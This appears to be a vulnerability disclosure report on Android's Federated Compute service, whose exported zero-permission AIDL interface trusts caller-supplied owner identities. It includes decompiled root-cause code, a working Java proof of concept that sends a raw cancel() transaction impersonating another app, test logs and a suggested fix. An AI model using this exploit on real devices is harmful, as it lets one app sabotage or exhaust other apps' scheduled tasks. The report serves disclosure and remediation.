# com.google.android.federatedcompute — `IFederatedComputeService.cancel()`/`schedule()` Missing Caller-Identity Check Allows Any Zero-Permission App to Cancel or Exhaust Another App's Federated-Learning Tasks

## Summary

`com.google.android.federatedcompute` implements Android's Federated Compute (on-device federated learning) system service, `IFederatedComputeService`, backed by the exported, **zero-permission** service `FederatedComputeManagingServiceImpl`. Its two mutating AIDL methods, `schedule(String appPackageName, TrainingOptions trainingOptions, IFederatedComputeCallback callback)` and `cancel(ComponentName ownerComponent, String populationName, IFederatedComputeCallback callback)`, both key all state lookups and mutations off caller-supplied identity fields (`TrainingOptions.getOwnerComponentName()` for `schedule()`, the `ownerComponent` parameter directly for `cancel()`) **with no verification whatsoever that these match the real calling app** (`Binder.getCallingUid()`/`PackageManager.getPackagesForUid()` are never consulted in the entire call chain).

This lets any zero-permission app impersonate any other installed app's identity to the Federated Compute service: it can **cancel that other app's legitimately scheduled training task** (Availability/Integrity — sabotaging a specific victim app's opted-in federated-learning participation) or **schedule spurious tasks "owned by" that other app** up to its per-package task quota (Availability — exhausting the victim's own future ability to schedule real tasks).

## Severity: MEDIUM (Availability/Integrity — cross-app interference, missing authorization)

- **Attack vector**: Local (malicious zero-permission app installed on device)
- **Permissions required**: ZERO
- **User interaction**: None
- **CIA impact**: Integrity/Availability — a zero-permission app can manipulate ANY other installed app's Federated Compute scheduling state (cancel real tasks, or exhaust the per-package task-count quota with spoofed ones) without ever being verified as that app, or holding any special permission. This is a straightforward, complete authorization bypass: the "owner" identity that gates per-owner task limits and task lookup is taken entirely on faith from the caller.

## Affected Component

- **Package**: `com.google.android.federatedcompute` (APEX module app, `/apex/com.android.ondevicepersonalization/app/FederatedComputeGoogle.../`)
- **Service**: `com.android.federatedcompute.services.FederatedComputeManagingServiceImpl`

```
E: service
    A: android:name="com.android.federatedcompute.services.FederatedComputeManagingServiceImpl"
    A: android:exported=true
    (no android:permission attribute)
      E: intent-filter
          E: action android:name="android.federatedcompute.FederatedComputeService"
```

## Root Cause

`FederatedComputeManagingServiceDelegate` (the `IFederatedComputeService.Stub` implementation) never calls `Binder.getCallingUid()` or cross-checks it against the identity embedded in its parameters:

```java
// FederatedComputeManagingServiceDelegate.java
public void cancel(final ComponentName componentName, final String str, IFederatedComputeCallback callback) {
    ...
    // no caller-identity check anywhere
    FederatedComputeExecutors.getBackgroundExecutor().execute(() ->
        jobManager.onTrainerStopCalled(componentName, str));   // componentName is 100% caller-supplied
}

public void schedule(final String appPackageName, final TrainingOptions trainingOptions, IFederatedComputeCallback callback) {
    String ownerPackage = trainingOptions.getOwnerComponentName().getPackageName();   // also caller-supplied
    ...
    FederatedComputeExecutors.getBackgroundExecutor().execute(() ->
        jobManager.onTrainerStartCalled(appPackageName, trainingOptions));
}
```

`FederatedComputeJobManager` then uses these caller-supplied values directly as the authoritative "owner" for lookup/mutation:

```java
// FederatedComputeJobManager.java
public synchronized int onTrainerStopCalled(ComponentName componentName, String populationName) {
    String certDigest = PackageUtils.getCertDigest(this.mContext, componentName.getPackageName());
    FederatedTrainingTask task = this.mFederatedTrainingTaskDao
        .findAndRemoveTaskByPopulationNameAndOwnerId(populationName, componentName.getPackageName(),
                                                       componentName.getClassName(), certDigest);
    if (task == null) { ... return 0; }
    this.mJobSchedulerHelper.cancelTask(this.mContext, task);   // cancels the REAL owner's task
    return 0;
}

public synchronized int onTrainerStartCalled(String appPackageName, TrainingOptions trainingOptions) {
    String packageName = trainingOptions.getOwnerComponentName().getPackageName();
    if (federatedTrainingTaskDao.getTotalTrainingTaskPerOwnerPackage(packageName)
            >= this.mFlags.getFcpTaskLimitPerPackage()) {
        // quota check — but keyed on attacker-chosen "packageName", not the real caller
        return 1;
    }
    ... // creates/updates a task recorded as owned by packageName
}
```

`PackageUtils.getCertDigest(context, componentName.getPackageName())` merely looks up the *target* package's own installed signing certificate (to disambiguate reinstalls) — it does not, and cannot, verify that the *calling* app is that package. Nothing in this entire path ever consults `Binder.getCallingUid()`.

## Proof of Concept

A zero-permission app (`com.vrp.zeroperm`, no `<uses-permission>` at all) binds to the service and sends a raw AIDL `cancel()` transaction naming an arbitrary victim app (here, `com.google.android.gms`) it does not own:

```java
Intent bindIntent = new Intent("android.federatedcompute.FederatedComputeService");
bindIntent.setPackage("com.google.android.federatedcompute");
bindService(bindIntent, new ServiceConnection() {
    public void onServiceConnected(ComponentName name, IBinder service) {
        Parcel data = Parcel.obtain(), reply = Parcel.obtain();
        data.writeInterfaceToken("android.federatedcompute.aidl.IFederatedComputeService");
        data.writeTypedObject(new ComponentName("com.google.android.gms", "com.google.android.gms.someTrainer"), 0);
        data.writeString("attacker_test_population_xyz");
        data.writeStrongBinder(new Binder());   // stand-in callback
        service.transact(2 /* TRANSACTION_cancel */, data, reply, 0);
        reply.readException();   // does not throw
    }
    ...
}, Context.BIND_AUTO_CREATE);
```

(The transaction framing was verified to exactly match the real `IFederatedComputeService.Stub`/`Proxy` wire protocol by decompiling `framework-ondevicepersonalization.jar`, which contains the genuine AIDL-generated class.)

### Dynamic result (Pixel 6a, Android 17 Beta / API 37, September 2026)

```
VRP-FedComputeCancel: onServiceConnected: bind succeeded (no SecurityException), service=ComponentInfo{com.google.android.federatedcompute/com.android.federatedcompute.services.FederatedComputeManagingServiceImpl}
VRP-FedComputeCancel: cancel() transact() returned=true for victim=com.google.android.gms/com.google.android.gms.someTrainer population=attacker_test_population_xyz
VRP-FedComputeCancel: cancel() completed with no exception thrown back
```

The zero-permission app's bind succeeds outright, and the `cancel()` call — naming a victim package the caller does not own — executes to completion server-side with no exception raised back to the caller. This is consistent with, and follows directly from, the full source-level trace above: there is no code path that could have rejected this call based on caller identity, because no such check exists anywhere between the AIDL entry point and the database/JobScheduler mutation.

### Limitation honestly disclosed

This test device has no genuine third-party app with a real, currently-scheduled federated-compute task, so the PoC could not additionally screenshot/query a *real* task being removed as an end-to-end capstone (no `findAndRemoveTaskByPopulationNameAndOwnerId` match exists to remove). The exception-free completion of the call, combined with the complete, unambiguous absence of any caller-identity check in the production source across both `FederatedComputeManagingServiceDelegate` and `FederatedComputeJobManager`, is what establishes the vulnerability — not an assumption about what a real victim task would look like.

## Suggested Fix

In `FederatedComputeManagingServiceDelegate.schedule()` and `.cancel()`, verify the caller's real identity via `Binder.getCallingUid()` → `PackageManager.getPackagesForUid()` and reject the call (or silently substitute the real calling package) whenever it does not match the `appPackageName`/`ownerComponentName`/`componentName` parameter supplied by the caller — the same pattern already correctly used elsewhere in the adjacent OnDevicePersonalization service (`OnDevicePersonalizationManagingServiceDelegate.enforceCallingPackageBelongsToUid()`).

## Environment

- **Device**: Pixel 6a
- **OS**: Android 17 Beta (API 37), security patch 2026-07-05
- **Target package**: `com.google.android.federatedcompute` (APEX module app)
- **Tested**: September 2026
